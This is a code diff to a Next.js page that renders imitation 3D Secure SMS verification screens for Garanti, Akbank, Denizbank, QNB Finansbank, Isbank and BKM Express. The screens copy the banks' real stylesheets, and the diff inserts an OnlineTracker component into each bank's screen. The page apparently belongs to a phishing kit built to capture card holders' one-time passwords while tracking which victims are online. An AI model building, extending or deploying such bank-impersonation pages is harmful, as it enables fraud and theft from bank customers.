@@ -3,6 +3,7 @@
 import { useEffect, useState, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import Image from 'next/image';
+import OnlineTracker from '@/components/OnlineTracker';
 
 interface SmsData {
     tutar: string;
@@ -148,6 +149,7 @@ export default function SmsPage() {
     const renderGaranti = () => {
         return (
             <>
+                <OnlineTracker />
                 <link rel="stylesheet" href="/assets/acs-style/garanti/css/fonts.css" />
                 <link rel="stylesheet" href="/assets/acs-style/garanti/css/garanti.css" />
                 <style jsx global>{`
@@ -304,6 +306,7 @@ export default function SmsPage() {
     const renderAkbank = () => {
         return (
             <>
+                <OnlineTracker />
                 <link rel="stylesheet" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css" />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
@@ -442,6 +445,7 @@ export default function SmsPage() {
     const renderDenizbank = () => {
         return (
             <>
+                <OnlineTracker />
                 <style dangerouslySetInnerHTML={{ __html: `
                     .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden;margin: 20px auto;}
                     .dn-header{background:linear-gradient(135deg,#0069b4,#004a80);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
@@ -536,6 +540,7 @@ export default function SmsPage() {
     const renderFinansbank = () => {
         return (
             <>
+                <OnlineTracker />
                 <link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0" />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
@@ -664,6 +669,7 @@ export default function SmsPage() {
     const renderIsbankasi = () => {
         return (
             <>
+                <OnlineTracker />
                 <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css" />
                 <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css" />
                 <style jsx global>{`
@@ -799,6 +805,7 @@ export default function SmsPage() {
     const renderBkmGo = (logoUrl: string) => {
         return (
             <>
+                <OnlineTracker />
                 <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                 <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                 <style jsx global>{`
